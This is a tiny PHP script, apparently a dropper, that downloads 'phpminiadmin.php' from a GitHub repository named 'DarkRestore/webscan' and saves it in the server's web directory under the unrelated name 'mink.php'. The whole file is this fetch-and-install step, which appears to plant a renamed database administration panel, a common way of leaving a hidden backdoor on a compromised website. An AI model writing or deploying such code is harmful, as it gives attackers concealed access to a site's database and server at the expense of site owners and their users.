<?php
$fileContent = file_get_contents('https://raw.githubusercontent.com/DarkRestore/webscan/refs/heads/main/phpminiadmin.php');
if ($fileContent) {
    file_put_contents(__DIR__ . '/mink.php', $fileContent);

}
?>